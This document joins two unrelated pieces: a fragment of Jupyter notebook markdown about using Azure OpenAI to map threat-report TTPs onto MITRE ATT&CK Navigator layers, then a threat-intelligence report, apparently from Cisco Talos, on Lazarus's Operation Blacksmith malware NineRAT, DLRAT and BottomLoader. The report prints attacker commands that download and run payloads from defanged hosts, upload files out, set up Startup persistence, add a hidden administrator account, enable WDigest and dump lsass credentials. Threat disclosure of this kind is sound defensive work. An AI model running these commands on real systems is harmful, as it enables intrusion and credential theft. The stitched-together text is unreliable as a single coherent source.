        "One of the fascinating applications of Jupyter Notebook is in the field of Cybersecurity, where it can be used to **visualize cyber threat data**. This involves creating an interactive Mitre Attack Navigator Layer and TTPs (Tactics, Techniques, and Procedures) Timeline using Azure OpenAI.\n",
        "\n",
        "The process involves several steps, including building a web scraper for blog post data, leveraging Azure OpenAI for TTPs extraction, providing a Mitre Attack Layer JSON file, uploading to Mitre Attack Navigator, displaying the Mitre Attack Navigator Layer, generating an attack timeline with Mermaid, and visualizing the attack path.\n",
        "\n",
        "The notebook begins by <u>extracting insights from a blog post</u> using a web scraper. The scraped <u>blog post is then analyzed to extract TTPs</u> related to cybersecurity. The extracted TTPs are then used to <u>create a Mitre Attack Layer JSON file</u>. This file is then uploaded to the <u>Mitre Attack Navigator for visualization</u>. Finally, <u>the attack path is visualized</u> using a Mermaid.js timeline graph.\n",
        "\n",
        "This notebook stands as an **example of how Jupyter Notebook, coupled with Azure OpenAI, can be used to visualize complex data such as cyber threat data**. The resulting visualizations not only provide a clear picture of the threat landscape but also help in making informed decisions and strategies to counter the threats.\n",

We track this Telegram-based RAT as “NineRAT” and the non-Telegram-based RAT as “DLRAT.” We track the DLang-based downloader as “BottomLoader.”Our latest findings indicate a definitive shift in the tactics of the North Korean APT group Lazarus Group. Over the past year and a half, Talos has disclosed three different remote access trojans (RATs) built using uncommon technologies in their development, like QtFramework, PowerBasic and, now, DLang.Talos has observed an overlap between our findings in this campaign conducted by Lazarus including tactics, techniques and procedures (TTPs) consistent with the North Korean state-sponsored group Onyx Sleet (PLUTIONIUM), also known as the Andariel APT group. Andariel is widely considered to be an APT sub-group under the Lazarus umbrella. This campaign consists of continued opportunistic targeting of enterprises globally that publicly host and expose their vulnerable infrastructure to n-day vulnerability exploitation such as CVE-2021-44228 (Log4j). We have observed Lazarus target manufacturing, agricultural and physical security companies.Lazarus Group’s, Operation Blacksmith compromised manufacturing, agriculture and physical security sectorsOperation Blacksmith involved the exploitation of CVE-2021-44228, also known as Log4Shell, and the use of a previously unknown DLang-based RAT utilizing Telegram as its C2 channel. We’re naming this malware family “NineRAT.” NineRAT was initially built around May 2022 and was first used in this campaign as early as March 2023, almost a year later, against a South American agricultural organization. We then saw NineRAT being used again around September 2023 against a European manufacturing entity. During our analysis, Talos found some overlap with the malicious attacks disclosed by Microsoft in October 2023 attributing the activity to Onyx Sleet, also known as PLUTIONIUM or Andariel. Talos agrees with other researchers’ assessment that the Lazarus APT is essentially an umbrella of sub-groups that support different objectives of North Korea in defense, politics, national security and research and development. Each sub-group operates its own campaigns and develops and deploys bespoke malware against their targets, not necessarily working in full coordination. Andariel is typically tasked with initial access, reconnaissance and establishing long-term access for espionage in support of North Korean government interests. In some cases, Andariel has also conducted ransomware attacks against healthcare organizations.The current campaign, Operation Blacksmith, consists of similarities and overlaps in tooling and tactics observed in previous attacks conducted by the Andariel group within Lazarus.A common artifact in this campaign was  “HazyLoad,” a custom-made proxy tool previously only seen in the Microsoft report. Talos found HazyLoad targeting a European firm and an American subsidiary of a South Korean physical security and surveillance company as early as May 2023.In addition to Hazyload, we discovered “NineRAT” and two more distinct malware families — both DLang-based — being used by Lazarus. This includes a RAT family we’re calling “DLRAT” and a downloader we call “BottomLoader” meant to download additional payloads such as HazyLoad on an infected endpoint.The adoption of DLang in Lazarus’ malware — NineRAT, DLRAT and BottomLoaderNineRAT uses Telegram as its C2 channel for accepting commands, communicating their outputs and even for inbound and outbound file transfer. The use of Telegram by Lazarus is likely to evade network and host-based detection measures by employing a legitimate service as a channel of C2 communications.NineRAT consists of three components, a dropper binary that contains two other components embedded in it. The dropper will write the two components on the disk and delete itself. The first component is an instrumentor, called nsIookup.exe ( capital ‘i’ instead of lower case L) that will execute the second component and will be used in the persistence mechanism. Modular infection chains such as these are frequently used by threat actors to achieve a multitude of objectives from defense evasion to functional separation of components that can be upgraded or modified while avoiding noisy operations on an infected system.The dropper will set up persistence for the first component using a BAT script. The persistence mechanism accepts a service name, the path to the first component and service creation parameters:\n\nService Creation commandsc create Aarsvc_XXXXXX binPath=c:\\windows\\system32\\nsIookup.exe -k AarSvcGroup -p type=own start=auto DisplayName=Agent Activation Runtime_XXXXXX\n\n(Note the use of a capital “i” instead of “L” in nslookup[.]exe.)The instrumentor binary contains a preconfigured path to the NineRAT malware which is used to execute the malware:Instrumentor binary (first component) containing the path to NineRAT malware on disk.With NineRAT activated, the malware becomes the primary method of interaction with the infected host. However, previously deployed backdoor mechanisms, such as the reverse proxy tool HazyLoad, remain in place. The multiple tools give overlapping backdoor entries to the Lazarus Group with redundancies in the event a tool is discovered, enabling highly persistent access. In previous intrusions such as the one disclosed by Talos in 2022, Lazarus relied heavily on the use of proxy tools as a means of continued access to issue commands and exfiltrate data.The Telegram C2 channels used by the malware led to the discovery of a previously public Telegram bot “[at]StudyJ001Bot” that was leveraged by Lazarus in NineRAT. This Bot is publicly illustrated along with its ID and communication URL in a tutorial in Korean language from 2020. Using a publicly accessible bot may lead to infrastructure hijacking and likely having recognized that, Lazarus started using their own Bots for NineRAT. Interestingly, switching over to their own Telegram C2 channels, however, did not deter the use of older NineRAT samples using open channels. Anadriel has continued to use them well into 2023, even though they first started work on NineRAT in 2022. NineRAT typically consists of two API tokens for interacting with two different Telegram channels — one of these tokens is publicly listed.NineRAT interacts with the Telegram channel using DLang-based libraries implemented to talk to Telegram’s APIs. Initially, the implant tests authentication using the getMe method. The implant can upload documents to Telegram using the sendDocument method/endpoint or download files via the getFile method. The malware can accept the following commands from their operator Telegram:\n\nCommandCapability/infoGather preliminary information about the infected system./setmtokenSet a token value./setbtokenSet a new Bot token./setintervalSet time interval between malware polls to the Telegram channel./setsleepSet a time period for which the malware should sleep/lie dormant./upgradeUpgrade to a new version of the implant./exitExit execution of the malware./uninstallUninstall self from the endpoint./sendfileSend a file to the C2 server from the infected endpoint.\n\nNineRAT can also uninstall itself from the system using a BAT file.Below are some of the commands run by NineRAT for reconnaissance:\n\nCommandIntentwhoamiSystem Information Discovery [T1082]wmic os get osarchitectureSystem Information Discovery [T1082]WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayNameSoftware Discovery [T1518]\n\nPivoting off the NineRAT samples, we discovered two additional malware families written in DLang by Lazarus. One of these is simply a downloader we track as “BottomLoader” meant to download and execute the next stage payload from a remote host such as HazyLoad:Strings and embedded payload URL in the DLang-based downloader, BottomLoader.BottomLoader can download the next stage payload from a hardcoded remote URL via a PowerShell command:powershell Invoke-webrequest -URI <URL> -outfile <file_location_on_system>It can also upload files to the C2, again using PowerShell:powershell (New-Object System.Net.WebClient).UploadFile('<file_path>','<remote_url>’)BottomLoader can also create persistence for newer versions or completely new follow-up payloads by creating a “.URL” file in the Startup directory to run the PowerShell command to download the payload. The URL file is constructed using the following commands:\n\nCommandecho [InternetShortcut] > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"echo URL=\"\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"echo IconFile=C:\\WINDOWS\\system32\\SHELL32.dll >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"echo IconIndex=20 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"\n\nThe other malware is a downloader and RAT, we track as “DLRAT,” which can be used to deploy additional malware and retrieve commands from the C2 and execute them on the infected endpoints:DLRAT: A DLang-based RAT and downloader.This malware contains hardcoded commands to perform system reconnaissance. It starts by executing the commands on the endpoint to gather preliminary information about the system: “ver”, “whoami” and “getmac”. With this, the operators will have information about the version of the operating system, which user is running the malware and MAC address that allows them to identify the system on the network.DLRAT code snippet consisting of preliminary data gathering capabilities.Once the first initialization and beacon is performed, an initialization file is created, in the same directory, with the name “SynUnst.ini”.After beaconing to the C2, the RAT will post, in a multipart format, the collected information and hardcoded session information.During our analysis, we found that the session information ID used by DLRAT as part of its communications with its C2 server is “23wfow02rofw391ng23“, which is the same value that we found during our previous research into MagicRAT. In the case of MagicRAT, the value is encoded as an HTML post. But with DLRAT, it's being posted as multipart/form-data. This session information is hardcoded into the DLRAT malware as a base64-encoded string constructed on the process stack during runtime:Hardcoded Session ID in DLRAT, the same as MagicRAT.The C2 reply only contains the external IP address of the implant. The malware recognizes the following command codes/names sent by the C2 servers to execute corresponding actions on the infected system:\n\nCommand nameCapabilitydeletemeDelete itself from the system using a BAT file.downloadDownload files from a specified remote location.renameRename files on the system.iamsleepInstructs the implant to go to sleep for a specified amount of time.uploadUpload files to C2.showurlsEmpty command (Not implemented yet).\n\nIllustrating operation BlacksmithThis particular attack observed by Talos involves the successful exploitation of CVE-2021-44228, also known as Log4Shell, on publicly facing VMWare Horizon servers, as a means of initial access to vulnerable public-facing servers. Preliminary reconnaissance follows the initial access leading to the deployment of a custom-made implant on the infected system. Typical Infection chain observed in Operation Blacksmith.Phase 1: Initial reconnaissance by LazarusLazarus’s initial access begins with successful exploitation of CVE-2021-44228, the infamous Log4j vulnerability discovered in 2021. The vulnerability has been extensively exploited by the Lazarus umbrella of APT groups to deploy several pieces of malware and dual-use tools, and to conduct extensive hands-on-keyboard activity.\n\nCommandIntentcmd.exe /c whoamiSystem Information Discovery [T1082]cmd.exe /c wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /c:5 /q:*[System [(EventID=25)]] /rd:true /f:textQuery event logs: Get RDP session reconnection informationnet userSystem Information Discovery [T1082]cmd.exe /c dir /a c:\\users\\System Information Discovery [T1082]cmd.exe /c netstat -nap tcpSystem Information Discovery [T1082]systeminfoSystem Information Discovery [T1082]cmd.exe /c Reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WdigestOS Credential Dumping [T1003/005]cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1OS Credential Dumping [T1003/005]Modify Registry [T1112]cmd.exe /c tasklist | findstr SecuSoftware Discovery [T1518]\n\nOnce the initial reconnaissance has been completed, Lazarus’ operators deployed HazyLoad, a proxy tool used to establish direct access to the infected system without having to repeatedly exploit CVE-2021-44228.\n\nCommandActioncmd[.]exe /c powershell[.]exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System[.]Net[.]WebClient).DownloadFile('hxxp[://]/inet[.]txt', 'c:\\windows\\adfs\\de\\inetmgr[.]exe');Download and execute HazyLoadc:\\windows\\adfs\\de\\inetmgr[.]exe -i  -pExecute HazyLoad reverse proxycmd /C powershell Invoke-WebRequest hxxp[://]/down/bottom[.]gif -OutFile c:\\windows\\wininet64[.]execmd /C c:\\windows\\wininet64[.]exe -i  -p 443Download and execute HazyLoad\n\nIn certain instances, the operators will also switch HazyLoad over to a new remote IP address. This is a common tactic attackers use to maintain continued access to previously compromised systems as their infrastructure evolves.\n\nCommandActioncmd /C taskkill /IM wininet64[.]exe /FStop original HazyLoad executioncmd /C c:\\windows\\wininet64[.]exe -i  -p 443ReLaunch HazyLoad with new parameters\n\nThe threat actors also created an additional user account on the system, granting it administrative privileges. Talos documented this TTP earlier this year, but the activity observed previously was meant to create unauthorized user accounts at the domain level. In this campaign, the operators created a local account, which matches the user account documented by Microsoft.\n\nCommandIntentcmd.exe /c net user krtbgt  /addAccount Creation [T1136]cmd.exe /c net localgroup Administrators krtbgt /addAccount Creation[T1098]cmd.exe /c net localgroup AdministratorsUser Discovery [T1033]\n\nOnce the user account was successfully set up, the attackers switched over to it for their hands-on-keyboard activity, which constitutes a deviation from the pattern Cisco Talos previously documented. The hands-on-keyboard activity begins by downloading and using credential dumping utilities such as ProcDump and MimiKatz.\n\nCommandIntentprocdump.exe -accepteula -ma lsass.exe lsass.dmpCredential harvesting [T1003]pwdump.exe   //MimikatzCredential harvesting [T1003]\n\nPhase 2: Lazarus deploys NineRATOnce the credential dumping is complete, Lazarus deploys a previously unknown RAT we’re calling “NineRAT” on the infected systems. NineRAT was first seen being used in the wild by Lazarus as early as March 2023. NineRAT is written in DLang and indicates a definitive shift in TTPs from APT groups falling under the Lazarus umbrella with the increased adoption of malware being authored using non-traditional frameworks such as the Qt framework, including MagicRAT and QuiteRAT.Once NineRAT is activated, it accepts preliminary commands from the Telegram-based C2 channel, to again fingerprint the infected systems. Re-fingerprinting the infected systems indicates the data collected by Lazarus via NineRAT may be shared by other APT groups and essentially resides in a different repository from the fingerprint data collected initially by Lazarus during their initial access and implant deployment phase.Commands typically executed by NineRAT include:\n\nCommandIntentcmd.exe /C ipconfig /allSystem Information Discovery [T1082]cmd.exe /C verSystem Information Discovery [T1082]cmd.exe /C wmic os get osarchitectureSystem Information Discovery [T1082]cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayNameSoftware Discovery [T1518]cmd.exe /C net group /domain Domain ComputersSystem Information Discovery [T1082]cmd.exe /C netstat -nap tcpSystem Information Discovery [T1082]cmd.exe /C whoamiSystem Information Discovery [T1082]\n\nCoverageWays our customers can detect and block this threat are listed below.Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
